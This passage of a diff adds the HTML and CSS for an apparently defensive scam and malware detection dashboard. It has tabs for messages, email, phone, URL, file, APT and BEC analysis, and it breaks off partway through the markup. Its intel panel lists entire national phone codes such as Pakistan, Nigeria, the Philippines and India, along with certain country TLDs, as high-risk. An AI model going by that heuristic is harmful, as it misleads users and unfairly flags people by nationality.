@@ -1,0 +1,1222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>PANTHOM-DETECTS // GLOBAL THREAT INTELLIGENCE</title>
+  <meta name="author" content="Abhirup Payne">
+  <meta name="description" content="Panthom-Detects - Advanced Global Threat Intelligence Platform. Real-time phone, email, URL, scam and malware detection.">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Orbitron:wght@400;700;900&family=Space+Mono:wght@400;700&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.16.105/pdf.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+  <style>
+    :root {
+      --gold: #FFB800; --gold-dim: #A07A00; --gold-bright: #FFE066;
+      --cyan: #00E5FF; --cyan-dim: #0099AA;
+      --red: #FF2D55; --green: #00FF87; --purple: #BB86FC;
+      --bg-deep: #020509; --bg-panel: rgba(6,12,22,0.92);
+      --border: rgba(255,184,0,0.18); --border-hi: rgba(255,184,0,0.5);
+      --text: #C8DDEF; --text-dim: #5A7A94;
+      --shadow: 0 20px 60px -10px rgba(0,0,0,0.95),0 0 0 1px rgba(255,184,0,0.08),inset 0 1px 0 rgba(255,184,0,0.06);
+    }
+    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+    html, body { width:100%; height:100%; overflow:hidden; }
+    body { background:var(--bg-deep); font-family:'Rajdhani',sans-serif; color:var(--text); }
+    body::after { content:''; position:fixed; inset:0; z-index:9999; pointer-events:none; background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,0.03) 3px,rgba(0,0,0,0.03) 4px); }
+
+    #loading-screen { position:fixed; inset:0; background:var(--bg-deep); z-index:500; display:flex; flex-direction:column; align-items:center; justify-content:center; transition:opacity 1.2s ease; }
+    #loading-canvas { position:absolute; inset:0; width:100%; height:100%; display:block; }
+    .load-box {
+      position:relative; z-index:10; background:rgba(4,10,18,0.85); backdrop-filter:blur(16px);
+      border:1px solid var(--border-hi); box-shadow:0 0 80px -20px rgba(255,184,0,0.35),inset 0 0 60px rgba(255,184,0,0.03);
+      clip-path:polygon(0 0,calc(100% - 22px) 0,100% 22px,100% 100%,22px 100%,0 calc(100% - 22px));
+      padding:44px 64px; text-align:center; display:flex; flex-direction:column; align-items:center; gap:20px;
+    }
+    .ctlx { position:absolute; top:0; left:0; width:14px; height:14px; border-top:2px solid var(--gold); border-left:2px solid var(--gold); }
+    .cbrx { position:absolute; bottom:0; right:0; width:14px; height:14px; border-bottom:2px solid var(--gold); border-right:2px solid var(--gold); }
+    .load-title { font-family:'Orbitron',monospace; font-size:2.8rem; font-weight:900; color:var(--gold); letter-spacing:12px; text-shadow:0 0 40px rgba(255,184,0,0.55),0 0 80px rgba(255,184,0,0.2); animation:flicker 5s infinite; }
+    @keyframes flicker { 0%,93%,100%{opacity:1} 94%{opacity:0.65} 95%{opacity:1} 97%{opacity:0.8} }
+    .load-sub { font-family:'JetBrains Mono'; font-size:0.72rem; color:var(--cyan); letter-spacing:5px; text-transform:uppercase; }
+    .load-phase { font-family:'Space Mono'; font-size:0.9rem; color:var(--text); min-height:1.8rem; }
+    .progress-track { width:340px; height:3px; background:#0a1826; position:relative; }
+    .progress-track::before,.progress-track::after { content:''; position:absolute; top:-4px; width:10px; height:10px; border:1px solid var(--gold); background:var(--bg-deep); transform:rotate(45deg); }
+    .progress-track::before { left:-5px; } .progress-track::after { right:-5px; }
+    #progress-fill { height:100%; width:0%; background:linear-gradient(90deg,var(--gold-dim),var(--gold),var(--cyan)); box-shadow:0 0 14px var(--gold); transition:width 0.08s linear; position:relative; }
+    #progress-fill::after { content:''; position:absolute; right:-1px; top:-5px; width:2px; height:13px; background:white; box-shadow:0 0 8px white; }
+    #load-pct { font-family:'JetBrains Mono'; font-size:0.68rem; color:var(--text-dim); }
+
+    #app { opacity:0; visibility:hidden; transition:opacity 0.9s ease 0.2s; width:100%; height:100%; }
+    #app.visible { opacity:1; visibility:visible; }
+    #bg-canvas { position:fixed; inset:0; width:100%; height:100%; z-index:0; pointer-events:none; }
+
+    .dashboard { position:relative; z-index:5; width:100vw; height:100vh; display:grid; grid-template-columns:380px 1fr 340px; grid-template-rows:60px 1fr 42px; gap:8px; padding:10px 12px; }
+
+    .panel { background:var(--bg-panel); backdrop-filter:blur(22px) saturate(1.6); border:1px solid var(--border); box-shadow:var(--shadow); position:relative; overflow:hidden; transition:border-color 0.3s,box-shadow 0.3s; }
+    .panel::before { content:''; position:absolute; top:0; left:0; right:0; height:1px; z-index:2; background:linear-gradient(90deg,transparent,var(--border-hi) 40%,rgba(0,229,255,0.3) 60%,transparent); opacity:0.7; }
+    .panel.glow-red { border-color:rgba(255,45,85,0.55)!important; box-shadow:0 0 50px rgba(255,45,85,0.2),inset 0 0 30px rgba(255,45,85,0.04)!important; }
+    .panel.glow-green { border-color:rgba(0,255,135,0.35)!important; box-shadow:0 0 30px rgba(0,255,135,0.12)!important; }
+    .panel.glow-purple { border-color:rgba(187,134,252,0.35)!important; box-shadow:0 0 30px rgba(187,134,252,0.12)!important; }
+
+    .header { grid-column:1/-1; display:flex; align-items:center; justify-content:space-between; padding:0 18px; }
+    .logo-wrap { display:flex; align-items:center; gap:14px; }
+    .logo-hex { width:36px; height:36px; flex-shrink:0; background:linear-gradient(135deg,rgba(255,184,0,0.18),rgba(255,224,102,0.05)); border:1.5px solid var(--gold); display:flex; align-items:center; justify-content:center; clip-path:polygon(50% 0%,100% 25%,100% 75%,50% 100%,0% 75%,0% 25%); box-shadow:0 0 20px rgba(255,184,0,0.3); }
+    .logo-hex svg { width:18px; height:18px; fill:var(--gold); }
+    .logo { font-family:'Orbitron',monospace; font-size:1.7rem; font-weight:900; color:var(--gold); letter-spacing:7px; text-shadow:0 0 28px rgba(255,184,0,0.4); }
+    .logo em { color:var(--cyan); font-style:normal; font-weight:400; font-size:1.3rem; letter-spacing:3px; }
+    .owner-tag { font-family:'JetBrains Mono'; font-size:0.55rem; color:var(--text-dim); letter-spacing:2px; margin-left:8px; padding:2px 8px; border-left:2px solid var(--gold); }
+    .hdr-stats { display:flex; gap:20px; }
+    .hstat { text-align:center; padding:5px 14px; border:1px solid rgba(0,229,255,0.18); background:rgba(0,229,255,0.04); }
+    .hstat .v { font-family:'JetBrains Mono'; font-size:1rem; font-weight:700; color:var(--cyan); }
+    .hstat .l { font-family:'JetBrains Mono'; font-size:0.55rem; color:var(--text-dim); letter-spacing:2px; text-transform:uppercase; }
+    .hdr-right { display:flex; align-items:center; gap:12px; }
+    .sys-dot { width:8px; height:8px; border-radius:50%; background:var(--green); box-shadow:0 0 10px var(--green); animation:blink 2s infinite; }
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.35} }
+    .sys-lbl { font-family:'JetBrains Mono'; font-size:0.68rem; color:var(--green); letter-spacing:2px; }
+    #live-clock { font-family:'JetBrains Mono'; font-size:0.72rem; color:var(--text-dim); letter-spacing:2px; }
+
+    .left-panel { grid-row:2; display:flex; flex-direction:column; overflow:hidden; }
+    .tabs { display:grid; grid-template-columns:repeat(10,1fr); border-bottom:1px solid var(--border); flex-shrink:0; }
+    .tab-btn { background:transparent; border:none; border-right:1px solid var(--border); color:var(--text-dim); padding:9px 3px; font-family:'Orbitron'; font-size:0.4rem; cursor:pointer; text-transform:uppercase; letter-spacing:0.5px; display:flex; flex-direction:column; align-items:center; gap:3px; transition:all 0.2s; position:relative; }
+    .tab-btn:last-child { border-right:none; }
+    .tab-btn .ti { font-size:0.9rem; line-height:1; }
+    .tab-btn::after { content:''; position:absolute; bottom:0; left:0; right:0; height:2px; background:var(--gold); transform:scaleX(0); transition:transform 0.2s; box-shadow:0 0 8px var(--gold); }
+    .tab-btn.active { color:var(--gold); background:rgba(255,184,0,0.06); }
+    .tab-btn.active::after { transform:scaleX(1); }
+    .tab-btn:hover:not(.active) { color:var(--text); background:rgba(255,255,255,0.025); }
+    .tabs-body { flex:1; overflow-y:auto; padding:12px 14px; scrollbar-width:thin; scrollbar-color:var(--border) transparent; }
+
+    .lbl { font-family:'JetBrains Mono'; font-size:0.6rem; color:var(--text-dim); letter-spacing:2.5px; text-transform:uppercase; margin:6px 0 5px; display:flex; align-items:center; gap:7px; }
+    .lbl::before { content:'//'; color:var(--gold); opacity:0.6; }
+    .lbl-line { flex:1; height:1px; background:linear-gradient(90deg,var(--border),transparent); }
+
+    textarea, input[type=text] { width:100%; background:rgba(2,5,9,0.85); border:1px solid rgba(255,184,0,0.14); color:var(--text); padding:11px 13px; font-family:'JetBrains Mono'; font-size:0.74rem; resize:vertical; outline:none; transition:all 0.2s; border-radius:2px; margin-top:6px; }
+    textarea:focus, input[type=text]:focus { border-color:rgba(0,229,255,0.45); box-shadow:0 0 18px rgba(0,229,255,0.1); }
+    textarea::placeholder, input::placeholder { color:var(--text-dim); opacity:0.45; }
+
+    .btn { position:relative; overflow:hidden; background:transparent; border:1px solid var(--gold); color:var(--gold); padding:9px 16px; font-family:'Orbitron'; font-size:0.6rem; letter-spacing:2.5px; cursor:pointer; text-transform:uppercase; transition:all 0.18s; white-space:nowrap; clip-path:polygon(0 0,calc(100% - 7px) 0,100% 7px,100% 100%,7px 100%,0 calc(100% - 7px)); }
+    .btn::before { content:''; position:absolute; inset:0; background:var(--gold); transform:translateX(-105%); transition:transform 0.2s cubic-bezier(0.16,1,0.3,1); }
+    .btn:hover::before { transform:translateX(0); }
+    .btn:hover { color:var(--bg-deep); box-shadow:0 0 28px rgba(255,184,0,0.35); }
+    .btn > span { position:relative; z-index:1; }
+    .btn-c { border-color:var(--cyan); color:var(--cyan); } .btn-c::before { background:var(--cyan); }
+    .btn-r { border-color:var(--red); color:var(--red); } .btn-r::before { background:var(--red); }
+    .btn-p { border-color:var(--purple); color:var(--purple); } .btn-p::before { background:var(--purple); }
+    .btn-group { display:flex; gap:7px; flex-wrap:wrap; margin-top:10px; }
+
+    .hbox { background:rgba(2,5,9,0.75); padding:11px 13px; border:1px solid rgba(255,184,0,0.1); border-left:3px solid var(--gold); font-size:0.71rem; margin:7px 0; max-height:120px; overflow-y:auto; font-family:'JetBrains Mono'; line-height:1.7; scrollbar-width:thin; scrollbar-color:var(--border) transparent; }
+    .hl { background:rgba(255,45,85,0.22); color:#FF8080; padding:1px 5px; border:1px solid rgba(255,45,85,0.35); border-radius:1px; }
+    .feed-box { background:rgba(2,5,9,0.75); padding:9px 11px; border:1px solid rgba(255,184,0,0.09); overflow-y:auto; scrollbar-width:thin; scrollbar-color:var(--border) transparent; }
+    .feed-item { font-family:'JetBrains Mono'; font-size:0.67rem; padding:4px 0; border-bottom:1px solid rgba(255,184,0,0.055); color:var(--text); display:flex; gap:7px; line-height:1.5; align-items:flex-start; }
+    .fi-cat { color:var(--gold); opacity:0.8; flex-shrink:0; font-size:0.58rem; padding:1px 5px; border:1px solid rgba(255,184,0,0.2); margin-top:1px; }
+    .fi-cat.cp { color:var(--cyan); border-color:rgba(0,229,255,0.2); }
+    .fi-cat.cu { color:#FF8C00; border-color:rgba(255,140,0,0.2); }
+    .fi-cat.cf { color:var(--red); border-color:rgba(255,45,85,0.3); }
+    .fi-cat.pz { color:var(--purple); border-color:rgba(187,134,252,0.2); }
+    .fi-wt { color:var(--red); flex-shrink:0; } .fi-tx { flex:1; }
+
+    .dropzone { border:1px dashed rgba(0,229,255,0.28); border-radius:3px; padding:26px 18px; text-align:center; background:rgba(0,229,255,0.025); margin:10px 0; transition:all 0.2s; cursor:pointer; }
+    .dropzone:hover,.dropzone.dragover { background:rgba(0,229,255,0.055); border-color:rgba(0,229,255,0.55); box-shadow:0 0 28px rgba(0,229,255,0.09); }
+    .dz-icon { font-size:2.2rem; margin-bottom:6px; opacity:0.65; }
+    .dz-txt { font-family:'Orbitron'; font-size:0.62rem; letter-spacing:3px; color:var(--text-dim); }
+    .dz-sub { font-family:'JetBrains Mono'; font-size:0.6rem; color:var(--text-dim); opacity:0.45; margin-top:5px; }
+
+    .demo-card { background:rgba(2,5,9,0.65); border:1px solid var(--border); padding:9px 12px; margin:5px 0; transition:all 0.18s; position:relative; overflow:hidden; cursor:pointer; }
+    .demo-card::before { content:''; position:absolute; left:0; top:0; bottom:0; width:3px; background:var(--gold); transform:scaleY(0); transform-origin:bottom; transition:transform 0.18s; }
+    .demo-card:hover { background:rgba(255,184,0,0.045); border-color:rgba(255,184,0,0.28); }
+    .demo-card:hover::before { transform:scaleY(1); }
+    .dc-type { font-family:'Orbitron'; font-size:0.58rem; color:var(--gold); letter-spacing:2px; margin-bottom:3px; }
+    .dc-pre { font-family:'JetBrains Mono'; font-size:0.66rem; color:var(--text-dim); }
+
+    .exp-card { background:rgba(2,5,9,0.55); border:1px solid var(--border); border-left:3px solid var(--gold); padding:11px 13px; margin:7px 0; }
+    .exp-cat { font-family:'Orbitron'; font-size:0.62rem; letter-spacing:2px; color:var(--gold); margin-bottom:7px; text-transform:uppercase; }
+    .exp-ul { margin-left:10px; list-style:none; }
+    .exp-ul li { color:var(--text); font-size:0.74rem; padding:2px 0; line-height:1.5; }
+    .exp-ul li::before { content:'→ '; color:var(--cyan); font-size:0.68rem; }
+    .edu-card { background:rgba(2,5,9,0.55); border:1px solid var(--border); border-left:3px solid var(--cyan); padding:9px 13px; margin:5px 0; font-size:0.78rem; line-height:1.55; }
+
+    .center-panel { grid-row:2; display:flex; flex-direction:column; padding:14px 18px; }
+    .gauge-lbl { font-family:'JetBrains Mono'; font-size:0.62rem; color:var(--text-dim); letter-spacing:4px; text-transform:uppercase; margin-bottom:8px; text-align:center; display:flex; align-items:center; gap:10px; }
+    .gauge-lbl::before,.gauge-lbl::after { content:''; flex:1; height:1px; background:linear-gradient(90deg,transparent,var(--border)); }
+    .gauge-lbl::after { background:linear-gradient(90deg,var(--border),transparent); }
+    #speedometer { width:100%; max-width:310px; display:block; margin:0 auto; }
+    .risk-bands { display:flex; gap:3px; margin:8px 0; padding:0 8px; }
+    .rb { flex:1; height:5px; border-radius:1px; opacity:0.2; transition:opacity 0.4s,box-shadow 0.4s; }
+    .rb.on { opacity:1; }
+    .rb-s { background:var(--green); } .rb-s.on { box-shadow:0 0 8px var(--green); }
+    .rb-w { background:var(--gold); } .rb-w.on { box-shadow:0 0 8px var(--gold); }
+    .rb-h { background:#FF8C00; } .rb-h.on { box-shadow:0 0 8px #FF8C00; }
+    .rb-c { background:var(--red); } .rb-c.on { box-shadow:0 0 8px var(--red); }
+    .score-row { display:flex; align-items:baseline; gap:10px; justify-content:center; margin-top:-6px; }
+    #risk-score-text { font-family:'Orbitron'; font-size:4.2rem; font-weight:900; color:var(--gold); line-height:1; text-shadow:0 0 36px rgba(255,184,0,0.5); transition:color 0.5s,text-shadow 0.5s; }
+    .score-max { font-family:'JetBrains Mono'; font-size:0.95rem; color:var(--text-dim); align-self:flex-end; padding-bottom:10px; }
+    #verdict-text { font-family:'Orbitron'; font-size:1.45rem; font-weight:700; letter-spacing:9px; color:var(--green); text-align:center; margin:5px 0; transition:color 0.5s; text-shadow:0 0 18px currentColor; }
+    .bd-item { padding:5px 0; border-bottom:1px solid rgba(255,184,0,0.055); }
+    .bd-row { display:flex; justify-content:space-between; font-family:'JetBrains Mono'; font-size:0.66rem; margin-bottom:3px; }
+    .bd-cat { color:var(--text-dim); } .bd-val { color:var(--gold); }
+    .bd-bar { height:3px; background:var(--gold); border-radius:1px; transition:width 0.5s cubic-bezier(0.16,1,0.3,1); box-shadow:0 0 5px var(--gold); }
+
+    .right-panel { grid-row:2; display:flex; flex-direction:column; overflow:hidden; }
+    .rp-sec { padding:12px 14px; border-bottom:1px solid var(--border); overflow-y:auto; }
+    .rp-sec:last-child { border-bottom:none; flex:1; }
+    .sec-title { font-family:'Orbitron'; font-size:0.57rem; letter-spacing:3px; text-transform:uppercase; color:var(--text-dim); margin-bottom:8px; display:flex; align-items:center; gap:7px; }
+    .sec-title::before { content:''; width:4px; height:4px; background:var(--gold); transform:rotate(45deg); flex-shrink:0; }
+    .sec-count { color:var(--gold); font-size:0.53rem; margin-left:auto; }
+    .hist-item { display:flex; gap:7px; padding:5px 0; border-bottom:1px solid rgba(255,184,0,0.055); font-family:'JetBrains Mono'; font-size:0.63rem; align-items:center; }
+    .hi-t { color:var(--text-dim); flex-shrink:0; }
+    .hi-bar { flex:1; height:2px; background:rgba(255,255,255,0.06); border-radius:1px; position:relative; }
+    .hi-fill { position:absolute; left:0; top:0; height:100%; border-radius:1px; }
+    .hi-s { font-weight:700; flex-shrink:0; } .hi-v { letter-spacing:1px; font-size:0.58rem; flex-shrink:0; }
+    .phone-tag { display:inline-block; padding:2px 9px; margin:2px; border:1px solid rgba(0,229,255,0.22); background:rgba(0,229,255,0.05); color:var(--cyan); font-family:'JetBrains Mono'; font-size:0.62rem; }
+    .phone-tag.risk { border-color:rgba(255,45,85,0.38); background:rgba(255,45,85,0.07); color:#FF8080; }
+    .email-tag { display:inline-block; padding:2px 9px; margin:2px; border:1px solid rgba(255,184,0,0.22); background:rgba(255,184,0,0.05); color:var(--gold); font-family:'JetBrains Mono'; font-size:0.62rem; }
+    .email-tag.risk { border-color:rgba(255,45,85,0.38); background:rgba(255,45,85,0.07); color:#FF8080; }
+    .url-tag { display:inline-block; padding:2px 8px; margin:2px; border:1px solid rgba(255,45,85,0.28); background:rgba(255,45,85,0.07); color:#FF8080; font-family:'JetBrains Mono'; font-size:0.62rem; border-radius:1px; }
+    .url-tag.ok { border-color:rgba(0,255,135,0.28); background:rgba(0,255,135,0.04); color:var(--green); }
+
+    .footer { grid-column:1/-1; grid-row:3; display:flex; align-items:center; justify-content:space-between; padding:0 18px; }
+    .fl,.fr { font-family:'JetBrains Mono'; font-size:0.6rem; color:var(--text-dim); letter-spacing:0.5px; }
+    .fc { display:flex; gap:18px; }
+    .fstat { display:flex; align-items:center; gap:5px; font-family:'JetBrains Mono'; font-size:0.62rem; }
+    .fs-dot { width:5px; height:5px; border-radius:50%; }
+    .fstat span { color:var(--text-dim); }
+
+    #alert-banner { position:fixed; top:76px; left:50%; transform:translateX(-50%) translateY(-16px); z-index:400; opacity:0; pointer-events:none; transition:all 0.38s cubic-bezier(0.16,1,0.3,1); font-family:'Orbitron'; font-size:0.68rem; letter-spacing:3px; padding:9px 28px; text-transform:uppercase; clip-path:polygon(0 0,calc(100% - 9px) 0,100% 9px,100% 100%,9px 100%,0 calc(100% - 9px)); border:1px solid; }
+    #alert-banner.show { opacity:1; transform:translateX(-50%) translateY(0); }
+    #alert-banner.crit { background:rgba(255,45,85,0.14); border-color:var(--red); color:var(--red); box-shadow:0 0 36px rgba(255,45,85,0.28); }
+    #alert-banner.safe { background:rgba(0,255,135,0.09); border-color:var(--green); color:var(--green); box-shadow:0 0 20px rgba(0,255,135,0.18); }
+    #alert-banner.warn { background:rgba(255,184,0,0.1); border-color:var(--gold); color:var(--gold); box-shadow:0 0 20px rgba(255,184,0,0.18); }
+    .char-count { font-family:'JetBrains Mono'; font-size:0.58rem; color:var(--text-dim); text-align:right; margin-top:3px; }
+    ::-webkit-scrollbar { width:3px; } ::-webkit-scrollbar-track { background:transparent; } ::-webkit-scrollbar-thumb { background:var(--border); }
+    @keyframes spulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.04)} }
+    .sp { animation:spulse 0.35s ease; }
+    @keyframes tfade { from{opacity:0;transform:translateY(4px)} to{opacity:1;transform:translateY(0)} }
+    .tab-content { animation:tfade 0.18s ease; display:none; }
+    #tab-msg { display:block; }
+  </style>
+</head>
+<body>
+
+<div id="loading-screen">
+  <canvas id="loading-canvas"></canvas>
+  <div class="load-box">
+    <div class="ctlx"></div><div class="cbrx"></div>
+    <div class="load-title">PANTHOM-DETECTS</div>
+    <div class="load-sub">◈ Global Threat Intelligence Network ◈</div>
+    <div class="load-phase" id="human-phase">Initializing worldwide detection core...</div>
+    <div class="progress-track"><div id="progress-fill"></div></div>
+    <div id="load-pct">[ 0% ]</div>
+  </div>
+</div>
+
+<div id="alert-banner"></div>
+
+<div id="app">
+  <canvas id="bg-canvas"></canvas>
+  <div class="dashboard">
+
+    <div class="panel header">
+      <div class="ctlx"></div>
+      <div class="logo-wrap">
+        <div class="logo-hex"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg></div>
+        <div class="logo">PANTHOM<em>-DETECTS</em></div>
+        <div class="owner-tag">ABHIRUP PAYNE // GLOBAL SECURITY</div>
+      </div>
+      <div class="hdr-stats">
+        <div class="hstat"><div class="v" id="hdr-det">0</div><div class="l">Vectors</div></div>
+        <div class="hstat"><div class="v" id="scan-count">0</div><div class="l">Scans</div></div>
+        <div class="hstat"><div class="v" id="hdr-evasion">0</div><div class="l">Evasion</div></div>
+      </div>
+      <div class="hdr-right">
+        <div class="sys-dot"></div>
+        <div class="sys-lbl">GLOBAL ONLINE</div>
+        <div id="live-clock">--:--:--</div>
+      </div>
+    </div>
+
+    <div class="panel left-panel">
+      <div class="ctlx"></div><div class="cbrx"></div>
+      <div class="tabs">
+        <button class="tab-btn active" data-tab="msg"><span class="ti">✉</span>MSG</button>
+        <button class="tab-btn" data-tab="email"><span class="ti">📧</span>EMAIL</button>
+        <button class="tab-btn" data-tab="phone"><span class="ti">📞</span>PHONE</button>
+        <button class="tab-btn" data-tab="url"><span class="ti">🔗</span>URL</button>
+        <button class="tab-btn" data-tab="file"><span class="ti">📎</span>FILE</button>
+        <button class="tab-btn" data-tab="malware"><span class="ti">🛡️</span>MALWARE</button>
+        <button class="tab-btn" data-tab="apt"><span class="ti">⚔</span>APT</button>
+        <button class="tab-btn" data-tab="bec"><span class="ti">💼</span>BEC</button>
+        <button class="tab-btn" data-tab="demo"><span class="ti">🧪</span>DEMO</button>
+        <button class="tab-btn" data-tab="edu"><span class="ti">📚</span>INTEL</button>
+      </div>
+      <div class="tabs-body">
+        <!-- MSG TAB -->
+        <div id="tab-msg" class="tab-content">
+          <div class="lbl">Message Intelligence — SMS / Chat / Text <span class="lbl-line"></span></div>
+          <textarea id="msg-input" rows="7" placeholder="Paste any message, SMS, or suspicious text..."></textarea>
+          <div class="char-count" id="msg-cc">0 chars</div>
+        </div>
+        <!-- EMAIL TAB -->
+        <div id="tab-email" class="tab-content">
+          <div class="lbl">Email Header & Body Analysis <span class="lbl-line"></span></div>
+          <input type="text" id="email-input" placeholder="Sender email address...">
+          <textarea id="email-body" rows="5" placeholder="Paste email content or headers..." style="margin-top:8px;"></textarea>
+          <div class="lbl" style="margin-top:8px;">Extracted Email Addresses</div>
+          <div id="email-list-box" style="display:flex;flex-wrap:wrap;gap:3px;min-height:30px;"></div>
+        </div>
+        <!-- PHONE TAB -->
+        <div id="tab-phone" class="tab-content">
+          <div class="lbl">Global Phone Number Intelligence <span class="lbl-line"></span></div>
+          <input type="text" id="phone-input" placeholder="Enter phone number (e.g., +92 333 1234567)">
+          <div class="lbl" style="margin-top:10px;">Phone Analysis Results</div>
+          <div id="phone-analysis-box" class="hbox" style="min-height:80px;">[ Enter a phone number to analyze ]</div>
+        </div>
+        <!-- URL TAB -->
+        <div id="tab-url" class="tab-content">
+          <div class="lbl">Advanced URL Decomposer <span class="lbl-line"></span></div>
+          <textarea id="url-input" placeholder="Paste URLs (one per line)..."></textarea>
+          <div id="url-breakdown" style="margin-top:8px;"></div>
+          <button class="btn btn-c" id="quick-url-scan" style="width:100%;margin-top:10px;"><span>⬡ DEEP URL SCAN</span></button>
+        </div>
+        <!-- FILE TAB -->
+        <div id="tab-file" class="tab-content">
+          <div class="lbl">Document & Image Forensics <span class="lbl-line"></span></div>
+          <div class="dropzone" id="file-dropzone">
+            <div class="dz-icon">⬇</div>
+            <div class="dz-txt">DROP FILE HERE</div>
+            <div class="dz-sub">PDF · IMAGE · TXT · CSV · JSON · EML</div>
+            <input type="file" id="file-input" accept=".pdf,image/*,.txt,.json,.csv,.eml" style="display:none;">
+          </div>
+          <div id="file-status" style="font-family:'JetBrains Mono';font-size:0.63rem;color:var(--text-dim);margin-bottom:5px;"></div>
+          <div id="file-preview" class="hbox" style="max-height:95px;">[ awaiting file ]</div>
+        </div>
+        <!-- MALWARE TAB -->
+        <div id="tab-malware" class="tab-content">
+          <div class="lbl">Malware Detection & Analysis <span class="lbl-line"></span></div>
+          <div class="dropzone" id="malware-dropzone">
+            <div class="dz-icon">🛡️</div>
+            <div class="dz-txt">DROP SUSPICIOUS FILE</div>
+            <div class="dz-sub">EXE · DLL · JS · VBS · DOCM · PDF · ZIP</div>
+            <input type="file" id="malware-input" accept="*/*" style="display:none;">
+          </div>
+          <div id="malware-status" style="font-family:'JetBrains Mono';font-size:0.63rem;color:var(--text-dim);margin-bottom:5px;"></div>
+          <div id="malware-result" class="hbox" style="max-height:130px;background:rgba(255,45,85,0.05);border-left-color:var(--red);">[ awaiting malware sample ]</div>
+          <button class="btn btn-r" id="scan-malware-btn" style="width:100%;margin-top:8px;"><span>⚡ DEEP MALWARE SCAN</span></button>
+          <div class="lbl" style="margin-top:10px;">Malware Intel Feed</div>
+          <div id="malware-intel-feed" class="feed-box" style="max-height:110px;"><div class="feed-item"><span class="fi-tx" style="color:var(--text-dim);">[ No active threats ]</span></div></div>
+        </div>
+        <!-- APT TAB -->
+        <div id="tab-apt" class="tab-content">
+          <div class="lbl">APT & Advanced Threats <span class="lbl-line"></span></div>
+          <div class="exp-card">
+            <div class="exp-cat">🎯 APT DETECTION MATRICES</div>
+            <ul class="exp-ul">
+              <li>Command & Control (C2) pattern matching</li>
+              <li>Lateral movement signatures</li>
+              <li>Privilege escalation techniques</li>
+              <li>Data exfiltration markers</li>
+              <li>Supply chain attack detection</li>
+            </ul>
+          </div>
+          <textarea id="apt-input" placeholder="Paste IoCs, file hashes, domain names..." style="height:80px;margin-top:8px;"></textarea>
+          <button class="btn btn-p" id="apt-scan-btn" style="width:100%;margin-top:8px;"><span>⚔ SCAN FOR APT</span></button>
+          <div class="lbl" style="margin-top:10px;">APT FINDINGS</div>
+          <div id="apt-results" class="feed-box" style="max-height:100px;"><div class="feed-item"><span class="fi-tx" style="color:var(--text-dim);">[ awaiting analysis ]</span></div></div>
+        </div>
+        <!-- BEC TAB -->
+        <div id="tab-bec" class="tab-content">
+          <div class="lbl">Business Email Compromise <span class="lbl-line"></span></div>
+          <div class="exp-card">
+            <div class="exp-cat">💼 BEC ATTACK PATTERNS</div>
+            <ul class="exp-ul">
+              <li>Executive impersonation signals</li>
+              <li>Urgent payment requests</li>
+              <li>Domain spoofing detection</li>
+              <li>Unusual wire transfer patterns</li>
+            </ul>
+          </div>
+          <input type="text" id="bec-sender" placeholder="CEO/Executive email address...">
+          <textarea id="bec-message" placeholder="Paste suspicious email or message..." style="height:80px;margin-top:8px;"></textarea>
+          <button class="btn" id="bec-scan-btn" style="width:100%;margin-top:8px;"><span>🔍 ANALYZE BEC</span></button>
+          <div class="lbl" style="margin-top:10px;">BEC SIGNALS</div>
+          <div id="bec-results" class="feed-box" style="max-height:100px;"><div class="feed-item"><span class="fi-tx" style="color:var(--text-dim);">[ awaiting analysis ]</span></div></div>
+        </div>
+        <!-- DEMO TAB -->
+        <div id="tab-demo" class="tab-content">
+          <div class="lbl">Scam Scenario Library <span class="lbl-line"></span></div>
+          <div id="demo-list"></div>
+        </div>
+        <!-- EDU TAB -->
+        <div id="tab-edu" class="tab-content">
+          <div class="lbl">Global Threat Intelligence <span class="lbl-line"></span></div>
+          <div class="exp-card"><div class="exp-cat">🔴 Urgency & Pressure Tactics</div><ul class="exp-ul"><li>"Urgent", "Act now", "Immediate" are red flags.</li><li>Threats of account suspension or legal action.</li></ul></div>
+          <div class="exp-card"><div class="exp-cat">📞 Worldwide Phone Scams</div><ul class="exp-ul"><li>High-risk codes: +92 (Pakistan), +234 (Nigeria), +63 (Philippines), +91 (India scam centers).</li></ul></div>
+          <div class="exp-card"><div class="exp-cat">📧 Email Spoofing & Phishing</div><ul class="exp-ul"><li>Check sender domain carefully: banks don't use @gmail.com.</li><li>Look for SPF/DKIM failures in headers.</li></ul></div>
+          <div class="exp-card"><div class="exp-cat">🌐 URL Deception</div><ul class="exp-ul"><li>Typosquatting: amaz0n.com, paypa1.com.</li><li>Suspicious TLDs: .ru, .xyz, .top, .tk, .pw, .cc</li></ul></div>
+          <div class="exp-card"><div class="exp-cat">📞 Worldwide Helplines</div><ul class="exp-ul"><li>India: 1930 | cybercrime.gov.in</li><li>USA: 1-877-FTC-HELP</li><li>UK: 0300 123 2040</li></ul></div>
+        </div>
+        <div class="btn-group" style="margin-top:12px;">
+          <button class="btn" id="analyze-btn"><span>▶ RUN ANALYSIS</span></button>
+          <button class="btn btn-r" id="clear-btn"><span>⌧ CLEAR</span></button>
+        </div>
+        <div class="lbl" style="margin-top:10px;">Highlighted Threats <span class="lbl-line"></span></div>
+        <div id="highlighted-preview" class="hbox">[ awaiting scan ]</div>
+      </div>
+    </div>
+
+    <div class="panel center-panel">
+      <div class="ctlx"></div><div class="cbrx"></div>
+      <div class="gauge-lbl">GLOBAL THREAT RADAR</div>
+      <canvas id="speedometer" width="310" height="185"></canvas>
+      <div class="risk-bands">
+        <div class="rb rb-s" id="rb0"></div><div class="rb rb-s" id="rb1"></div><div class="rb rb-s" id="rb2"></div>
+        <div class="rb rb-w" id="rb3"></div><div class="rb rb-w" id="rb4"></div><div class="rb rb-w" id="rb5"></div>
